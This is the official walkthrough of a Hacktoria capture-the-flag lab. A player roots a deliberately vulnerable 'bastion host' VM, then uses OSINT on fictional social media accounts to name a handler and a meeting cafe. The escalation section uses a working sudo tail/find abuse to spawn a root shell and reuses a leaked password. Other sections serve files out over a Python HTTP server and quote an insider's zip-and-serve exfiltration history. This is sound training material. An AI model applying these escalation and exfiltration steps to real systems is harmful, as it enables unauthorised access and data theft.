![hacktorie-pixel-cyberpunk](https://user-images.githubusercontent.com/117080369/210135718-2b467f21-bc81-438c-b856-2ceb3f8b4375.png)

# Corporate Espionage - Official Walkthrough
![BoeShdw3_Corporate_espionage_600x600](https://user-images.githubusercontent.com/117080369/211158465-3fc47f69-191a-47a6-92c4-c1c2271ff2fa.png)

$~$
---

### $\color{magenta}{COLLAB\ INFO}$
This Collaboration Contract was made by our community member “BoΠeShΔdϴw³”.

https://www.twitter.com/B0neShad0w

If you would like to collaborate with Hacktoria on making your own contract, reach out to the Overseer role in our Discord community. We’re always open to hearing new ideas, don’t be shy!

Note: Hacktoria cannot guarantee the functionality of Collaboration Contracts.

$~$

### $\color{magenta}{PROLOGUE}$
It was just another Friday afternoon in the SOC, Lili was giving Louis a hard time about another date he had arranged for the weekend, you are such a dog joked Lili, to which Louis responded “yeah” but isn’t it cool. The whole team were in good spirits as the weekend was fast approaching, then suddenly Sam shouts out “look at the screens – LOOK!” – everybody stops and looks up, OH SHIT yells Louis, quick, get Sue in here. Sue rushes into the room her eyes widen, and she turns very pale…

She shouts we are under attack – quick, track these bastards, we need to isolate where this is coming from, unfortunately as quick as it started, it ended, save the logs! SAVE THE LOGS! shouts Sue.

Lili & Sam are frantically trying to gather the logs, that is weird mummers Lili, the logs are disappearing, f*** these guys are good says Louis, there goes our weekend. Sigh!
We are going to need some strong coffee in here guys.

$~$

### $\color{magenta}{BRIEFING}$
Greetings, Special Agent J.

We have an extremely urgent matter on our hands. One of our preferred suppliers of Ai tech fears they are subject to on-going data breach. Velocity9 is a small but very influential cutting-edge Ai tech company, a lot of major players use their tech, this ranges from autonomous drones for military use to smart speakers for the public domain, the list goes on and it is growing at an extraordinary rate.

We bought into their tech as early adopters for the “field kit” used by our agents. Their current analysis shows that a large amount of their “Proprietary Ai code” has been exfiltrated somehow! It is unclear at this point if this is a hacking attempt by a rival company, APT or worse by a member of staff. Most of the logs were either deleted or corrupted during the breach.

Your mission is to go in under cover with the guise of a “pentester” to evaluate their security model of the new “Bastion Hosts” security model, but actually try to ascertain who is responsible for the breach, remember these hosts are secure by design, so it will require a special touch to be able to perform your required tasks.

We have our suspicions as to which agency is behind this, but we need proof, this is where your help is needed, we must set the “bear trap”, track their movements and locate the stolen data before it falls into the wrong hands. You may need to dust off your “spy craft” shoes for this one Agent J. Our allies and the agency depend on you.

Note: A bastion host is a special-purpose server configured to withstand attacks. The server will generally host a single application or process. It is hardened in this manner primarily due to its purpose.

As always, Special Agent J. The contract is yours, if you choose to accept.

$~$
---

### $\color{magenta}{MATERIALS\ AND\ ANSWER\ INSTRUCTION}$
Password Instruction:

Lowercase letters, numbers and hyphens only
English language used for locations on Google Maps
password sample for flagfile: some-amenity-city-country-yyyy-mm-dd-hh-mm-handler

sample password: flower-shop-darwin-australia-1985-10-06-23-45-B0neShad0w

<a href="https://drive.google.com/drive/folders/1Bz2DgtzkcMr8mZXNSaDfOwbUNOBUY2DS">Download the Materials</a>

<a href="https://hacktoria.com/wp-content/contracts/flags/flagfile-corporate-espionage.zip">Download the Flagfile</a>

$~$

---

### $\color{magenta}{THE\ ASK}$
* Go in under cover with the guise of a “pentester”
* Ascertain who is responsible for the breach
* Track their movements
* Locate the stolen data before it falls into the wrong hands

$~$

### $\color{magenta}{GETTING\ STARTED}$
* Download the Virtual Machine <a href="https://drive.google.com/drive/folders/1Bz2DgtzkcMr8mZXNSaDfOwbUNOBUY2DS">OVA</a> file to your local machine.
* Import the Virtual Machine OVA file into <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox 7.0</a> 
* SSH onto the box using the credentials supplied in the `creds` file located in the <a href="https://drive.google.com/drive/folders/1Bz2DgtzkcMr8mZXNSaDfOwbUNOBUY2DS">starter-pack-corporate-espionage.zip</a> 

$~$

### $\color{magenta}{LAY\ OF\ THE\ LAND}$
As we know diddly squat about our target we need to get a lay of the land, I find the simplest method is just by running the `tree -a` command.

```
c199999@velocity9-bastion:~$ tree -a /home
/home
├── c199999
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   └── .profile
├── x100001
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   └── .profile
├── x104880
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── budget-2023
│   ├── budget-feb.xls
│   ├── budget-jan.xls
│   ├── .cache [error opening dir]
│   ├── .local
│   │   └── share [error opening dir]
│   └── .profile
├── x113931
│   ├── .bash_logout
│   ├── .bashrc
│   ├── CoralDraw
│   ├── Gimp
│   ├── Paint
│   ├── Paint3D
│   │   └── .configuration
│   ├── Photoshop
│   └── .profile
├── x121754
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   └── .profile
├── x122302
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   ├── team-downsizing
│   └── team-member-performance
├── x122488
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── letter
│   ├── .local
│   │   └── share [error opening dir]
│   ├── passwords.txt
│   ├── .profile
│   └── TODO
├── x124425
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── employee-complaints
│   ├── .local
│   │   └── share [error opening dir]
│   └── .profile
├── x126419
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── budget-2022.xls
│   ├── budget-2023.xls
│   ├── budget-jan.xls
│   ├── .cache [error opening dir]
│   └── .profile
├── x127395
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   └── .profile
├── x128489
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   └── .profile
├── x132589
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── health-report-5
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   └── todo-list
├── x132873
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── costings2.xls
│   ├── costings.xls
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   ├── report.pdf
│   ├── sales1
│   ├── sales2
│   ├── sales3
│   └── sales5
├── x150843
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── notes
│   ├── .profile
│   ├── python-sample-1
│   ├── python-sample-2
│   └── sample-code
├── x155796
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   └── report-20230106
├── x158049
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   └── useful-commands
├── x160095
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── .local
│   │   └── share [error opening dir]
│   ├── planned-leave
│   ├── .profile
│   ├── stress-test-results-Ai-engine-001
│   ├── stress-test-results-Ai-engine-002
│   ├── stress-test-results-Ai-engine-003
│   ├── stress-test-results-Ai-engine-004
│   ├── stress-test-results-Ai-engine-005
│   ├── stress-test-results-Ai-engine-006
│   ├── stress-test-results-Ai-engine-007
│   └── stress-test-results-Ai-engine-008
├── x160552
│   ├── 00001.Ai7
│   ├── 00002.Ai7
│   ├── 00003.Ai7
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── meeting-minutes
│   ├── .profile
│   └── resignation-letter
├── x160727
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── .local
│   │   └── share [error opening dir]
│   ├── outstanding-task-list
│   ├── .profile
│   └── .ssh [error opening dir]
├── x162310
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .cache [error opening dir]
│   ├── hardening-guide1.txt
│   ├── hardening-guide2.txt
│   ├── .local
│   │   └── share [error opening dir]
│   ├── misc-notes
│   ├── passwords2.txt
│   ├── .profile
│   └── service-accounts.txt
├── x170508
│   ├── application
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── bullying-proof.eml
│   ├── .cache [error opening dir]
│   ├── data-copy
│   │   ├── Ai
│   │   ├── DevOps
│   │   ├── Filer
│   │   ├── readme.md
│   │   └── tmp
│   │       └── Files [error opening dir]
│   ├── .local
│   │   └── share [error opening dir]
│   ├── note-to-self
│   ├── .profile
│   └── shares
├── x171604
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── .profile
│   └── upcoming-projects
├── x195184
│   ├── .bash_history
│   ├── .bash_logout
│   ├── .bashrc
│   ├── .local
│   │   └── share [error opening dir]
│   ├── old_creds
│   ├── .profile
│   ├── .S3cr3tD1r3ct0ry
│   │   └── .secret-data
│   ├── ticket-3585
│   ├── ticket-4645
│   └── ticket-4721
└── x196954
    ├── .bash_history
    ├── .bash_logout
    ├── .bashrc
    ├── .Branding
    │   ├── .Ai6
    │   │   └── 2022
    │   └── .Ai7
    │       └── .New-Branding-Ai7
    └── .profile

81 directories, 156 files
c199999@velocity9-bastion:~$ 
```

### Low hanging fruit 
We have located some interesting files to have a look through, maybe we get lucky and find passwords stored in some of these files.
* x113931/Paint3D/.configuration
```
c199999@velocity9-bastion:~$ cat /home/x113931/Paint3D/.configuration
Whether you're an artist or just want to try out some doodles, Paint 3D makes it easy to unleash your creativity and bring your ideas to life. Classic Paint has been reimagined, with an updated look and feel and lots of new brushes and tools. And now, create in every dimension. Make 2D masterpieces or 3D models that you can play with from all angles.

M1cr0s0ft (Easter Egg: 3 of 5)
c199999@velocity9-bastion:~$ 
```
No credentials found, but an "easter egg" has been found!

* x122488/passwords.txt\
Just a list of well-known passwords, not really much use

* x158049/useful-commands\
Nothing useful here either.

* x162310/passwords2.txt
```
c199999@velocity9-bastion:~$ cat /home/x162310/passwords2.txt
&!3p-vW)_N;]

r3mUV8y5 (Easter Egg: 2 of 5)

QVQ<.`c:X8d[6Uy

.)e'=n&^#C;^*fbSt34Ct&4U5T_GPG

2K"j-$BVR6#_YBY8d8dL?>Lm3)p,qb


c199999@velocity9-bastion:~$
```
Some interesting passwords, no clue what they pertain to though.\
However, there is another "easter egg".

* x162310/service-accounts.txt\
About as much use as a chocolate teapot!

* x195184/old_creds
```
c199999@velocity9-bastion:~$ cat /home/x195184/old_creds
Password: w2MJWio7hT
c199999@velocity9-bastion:~$
```
Could this be the users password?

* x195184/.S3cr3tD1r3ct0ry/.secret-data\
Just an Ascii Troll face - haha, very funny.

$~$

### $\color{magenta}{PRIVILEGE\ ESCALATION}$
We need to see if we have any real access to be able to do anything.
```
c199999@velocity9-bastion:~$ sudo -l
Matching Defaults entries for c199999 on velocity9-bastion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User c199999 may run the following commands on velocity9-bastion:
    (ALL) PASSWD: /bin/tail, /bin/ls
c199999@velocity9-bastion:~$ 
```
Doesn't look like we have much access, we need to elevate our privileges somehow.\
A quick `sudo -l` tells us we can run `tail` & `ls` commands elevated, so let's check out <a href="https://gtfobins.github.io/">GTFOBins</a> for any possible escalation routes.

Running the GTFOBins suggested command for `tail` we are able to read the `sudoers` file.
```
c199999@velocity9-bastion:~$ sudo tail -c1G /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root	ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL
x155796 ALL=(ALL) PASSWD: /bin/find, /bin/ls, /bin/cat, /bin/tree, /bin/tail
x158049 ALL=(ALL) PASSWD: /bin/find, /bin/ls, /bin/cat, /bin/tree, /bin/tail
x128489 ALL=(ALL) PASSWD: /bin/find, /bin/ls, /bin/cat, /bin/tree, /bin/tail
c199999 ALL=(ALL) PASSWD: /bin/tail, /bin/ls
x195184 ALL = NOPASSWD: /bin/find
# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
c199999@velocity9-bastion:~$
```
A possible of point horizontal privilege escalation is via x195184, remember it was this user that had the `old_creds` file in their home directory.\
No harm is trying...

```
c199999@velocity9-bastion:~$ su x195184
Password: 
x195184@velocity9-bastion:/home/c199999$ 
```
It worked!
We know this user is able to run the `find` command elevated.\
Quick check on GTFOBins again gives us a possible route to `root`

```
x195184@velocity9-bastion:/home/c199999$ sudo find . -exec /bin/sh \; -quit
# 
```
Boom, Pwn3d...

Currently we only have a basic shell, with no tab auto-complete etc. sigh!\
Let's improve that by upgrading to a fully interactive shell.

```
# script -q /dev/null
root@velocity9-bastion:/home/c199999#
```

![root](https://user-images.githubusercontent.com/117080369/211194010-68f23160-de49-44e9-951b-17b6d648f892.png)

$~$

### $\color{magenta}{BONUS\ -\ EASTER\ EGG}$
For a bit of fun I thought it would be cool to hide `easter eggs` within the contract but not mention anything about it.

If you remember back we already stumbled across 2 of the "easter eggs".
* M1cr0s0ft (Easter Egg: 3 of 5)
* r3mUV8y5 (Easter Egg: 2 of 5)

We know there are 5 easter eggs in total to find, now that we have root access this should be a trivial task locating the remaining 3 using a simple `find` command.

```
root@velocity9-bastion:/home/c199999# find /home -type f -exec grep -l -i "(Easter Egg:" {} \; 2>/dev/null
/home/x196954/.Branding/.Ai7/.New-Branding-Ai7
/home/x160727/outstanding-task-list
/home/x162310/passwords2.txt
/home/x113931/Paint3D/.configuration
root@velocity9-bastion:/home/c199999#
```

Egg 5:
```
root@velocity9-bastion:/home/c199999# cat /home/x196954/.Branding/.Ai7/.New-Branding-Ai7
 __   __   _         _ _        ___ 
 \ \ / /__| |___  __(_) |_ _  _/ _ \
  \ V / -_) / _ \/ _| |  _| || \_, /
   \_/\___|_\___/\__|_|\__|\_, |/_/ 
                           |__/    

Velocity9 (Easter Egg: 5 of 5)

To claim your Easter Egg put the 5 eggs together eggactly as found, seperated by a hypen, then go to /opt/.contract/.B0neShad0w

Example: egg1-Egg2-eGg3-egg4-EGG5 
root@velocity9-bastion:/home/c199999#
```

Egg 1:
```
root@velocity9-bastion:/home/c199999# cat /home/x160727/outstanding-task-list
1. Decom old Bastion server
2. Build 7 Ai engine servers
3. Harden 7 Ai engine servers
4. C0ffee (Easter Egg: 1 of 5)
5. Update build guides
6. Review password policy (current policy is a fucking joke!)
7. Document new password policy
8. Full SUDO review / report
9. Build new UAT & Pre Prod environment
10. Ask for pay rise (have been doing soo much non paid out of hours work)
11. Complete "The Rabbit Hole" contract on Hacktoria
12. On-board the new batch (lambs) of staff
13. Run a Vulnerability Assessment on the Bastion servers
14. Report VA findings to Sue
root@velocity9-bastion:/home/c199999# 

```

We have now found 4 of the 5 "easter eggs".\
Egg 1: C0ffee\
Egg 2: r3mUV8y5\
Egg 3: M1cr0s0ft\
Egg 5: Velocity9

We also found a hint as to how to claim your "Easter Egg", however this is pretty useless without egg number 4.

Let's run the find command again, but this time against our own home directory.

```
root@velocity9-bastion:/home/c199999# find /root -type f -exec grep -l -i "(Easter Egg:" {} \; 2>/dev/null
/root/.zshrc
root@velocity9-bastion:/home/c199999#
```

Haha, very sneaky.\
Egg 4: obfu5cation

Let's copy the Corporate-Espionage-Easter-Egg.zip file off the host.\
Change to the /opt/.contract/.B0neShad0w directory.

```
cd /opt/.contract/.B0neShad0w
```

Next we need to fire up a simple HTTP Server by running the command below.

```
python3 -m http.server
```

From our own machine run the following command to get a copy of the Corporate-Espionage-Easter-Egg.zip file.

```
wget http://<IP-ADDRESS>:8000/Corporate-Espionage-Easter-Egg.zip
```

Extract the `Corporate-Espionage-Easter-Egg.zip` with the password to claim your "Easter egg".

```
unzip -P C0ffee-r3mUV8y5-M1cr0s0ft-obfu5cation-Velocity9 Corporate-Espionage-Easter-Egg.zip
```

$~$

### $\color{magenta}{THE\ GAME\ IS\ AFOOT}$
Now that we have `root` access we can go "virtual dumpster diving" and try to figure out the root cause of the breach.

After looking through various users `.bash_history` we find a user `x170508` has been running some "out of the norm" commands, tut tut!
* zip -r exfiltrate.zip Files/
* python3 -m http.server

```
root@velocity9-bastion:/home/c199999# cat /home/x170508/.bash_history 
[SANITISED OUTPUT]
exit
sudo -l
exit
ls
cat shares 
ls /data-copy
ls data-copy
cat data-copy/readme.md 
clear
touch note-to-self
nano note-to-self 
touch application
nano application 
cat application 
echo "I hate Fredrick" | base64
echo "Looking forward to finding a new job" | base64
clear
zip --help
clear
exit
ls
history
ls
cd data-copy/
;s
ls
mkdir tmp
cd tmp/
smbclient //velocity9-GERTY/Ai
exit
ls
cd data-copy/tmp/
ls
zip -r exfiltrate.zip Files/
ls
file exfiltrate.zip 
python3 -m http.server
rm exfiltrate.zip 
ls
clear
cd
ls
python3 -m http.server
clear
exit
history -d 106
history
history -d 104
clear
exit
history
history -d 104
history
ls -lah
cat shares 
nano application 
nano note-to-self 
ping 8.8.8.8
nslookup google.com
exit
root@velocity9-bastion:/home/c199999# 
```
Armed with the Employee ID (x170508) we can find the name of the individual from the `Employee-directory-dec-2022.pdf` file located in the <a href="https://drive.google.com/drive/folders/1Bz2DgtzkcMr8mZXNSaDfOwbUNOBUY2DS">starter-pack-corporate-espionage.zip</a>

Now we can run a username search for `AlexandrieAudibert` using an awesome web tool called <a href="https://blackbird-osint.herokuapp.com/">Blackbird</a>

It's not long before we get a hit for a GitHub page, having a quick look at their <a href="https://github.com/AlexandrieAudibert">GitHub</a> page reveals they have a profile picture that matches the picture in the `Employee-directory-dec-2022.pdf` file, and also a link to their <a href="https://twitter.com/AlexAudibert_">Twitter</a> account.

![Screenshot 2023-01-08 122722](https://user-images.githubusercontent.com/117080369/211196012-8a36061a-7026-47db-ace2-682c86376577.png)

Searching through their <a href="https://twitter.com/AlexAudibert_/with_replies">Tweet & replies</a> feed we find some interactions with with a suspicious looking account.

> __Note__ NT99LF6LEP2 is only their Twitter ID, and not the handler name required.

![Screenshot 2023-01-08 124241](https://user-images.githubusercontent.com/117080369/211196631-19cbb914-c730-420d-b1d4-08e28a6df2cb.png)

This person has some very interesting text about the nameless and some code in their bio:
```
We have no names, man. No names. We are nameless!
⠊⠧⠉⠋⠖⠕⠚⠽⠑⠃⠥⠥⠛⠝⠗⠢⠛⠥⠶⠞⠑⠕⠚⠁⠊⠝⠙⠑⠁⠎⠗⠁⠓⠽⠵⠉⠁⠖⠁⠿
```
Let's go ahead and decode it using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.

```
⠊⠧⠉⠋⠖⠕⠚⠽⠑⠃⠥⠥⠛⠝⠗⠢⠛⠥⠶⠞⠑⠕⠚⠁⠊⠝⠙⠑⠁⠎⠗⠁⠓⠽⠵⠉⠁⠖⠁⠿
```

From Braille
```
IVCF6OJYEBUUGNR5GU7TEOJAINDEASRAHYZCA6A=
```

From Base32
```
ED_98 iC6=5?29 CF@J >2 x
```

Reverse
```
x 2> J@FC 92?5=6Ci 89_DE
```

ROT47
```
I am your handler: gh0st
```

It seems we now have the name of the handler:
* gh0st

Searching through their <a href="https://twitter.com/NT99LF6LEP2/with_replies">Tweet & replies</a> feed we find a Tweet to `Alexandrie` about a possible meeting location.

![Screenshot 2023-01-08 125819](https://user-images.githubusercontent.com/117080369/211197368-1a408be2-95ec-4381-9cc0-24e3f8b0971c.png)

Upon closer examination of the image we can make out the name of the cafe and a little piece of text that doesnt really fit in with the rest, it looks like it says `13:37`, maybe this is the meeting time.
* columbus
* 13-37

![screenshot (367)](https://user-images.githubusercontent.com/117080369/211197621-2b405bd5-8686-4708-8170-35025680f773.png)

Digging deeper into their interactions we find a poem, it looks as if some l33t has been applied to the text.

![Screenshot 2023-01-08 125233](https://user-images.githubusercontent.com/117080369/211197036-f6038657-3da7-4de3-8059-490a155ca340.png)

Extracting the numbers give us `20230313`, this looks suspiciously like a date, we know from the password format notes we are looking for a date:
* 2023-03-13

### $\color{magenta}{GEOLOCATION}$
From the information gained via the tweets and the style of the location in the image there is a high percentage that we are looking for a coffee shop or cafe. 

A quick Google search for `columbus coffee` tells us that this is a French based company, we also know that some of Alexandrie's tweets have been written in French.

![Screenshot 2023-01-08 131633](https://user-images.githubusercontent.com/117080369/211198058-80cf4d33-f6bd-403c-8fc5-91d4c1e6d023.png)

Let's run a search for `Columbus Cafe in France` in <a href="https://www.google.com/maps">Google Maps</a>.

![Screenshot 2023-01-08 131948](https://user-images.githubusercontent.com/117080369/211198231-5af4fb02-7491-4737-be63-5e7dccdc407f.png)

Scrolling through the results gives a potential match, the image, although from a different angle looks very similar to the location we are looking for.

![Screenshot 2023-01-08 132601](https://user-images.githubusercontent.com/117080369/211205817-31d9fe9a-25b3-4228-a2ce-0b267cd7ac39.png)

Browsing through the `Photos` of the cafe does confirm that this is indeed the meeting location.

![Screenshot 2023-01-08 132848](https://user-images.githubusercontent.com/117080369/211198619-b5237f9f-9e5f-4d28-848c-28fd5a06ecab.png)

All that is left to do is get confirmation of the name and address of the cafe.

![Screenshot 2023-01-08 133200](https://user-images.githubusercontent.com/117080369/211277879-bd49d090-7afb-4991-9958-68fe679e299e.png)

* columbus-cafe
* serris
* france

$~$

### $\color{magenta}{CONCLUSION}$
Putting all the pieces of the jigsaw together gives us the final answer.
* some-amenity: columbus-cafe
* city: serris
* country: france
* yyyy-mm-dd: 2023-03-13
* hh-mm: 13-37
* handler: gh0st

Password: columbus-cafe-serris-france-2023-03-13-13-37-gh0st

Extract the `flagfile-corporate-espionage.zip` with the password to get your contract card.

$~$

📌 BoΠeShΔdϴw³
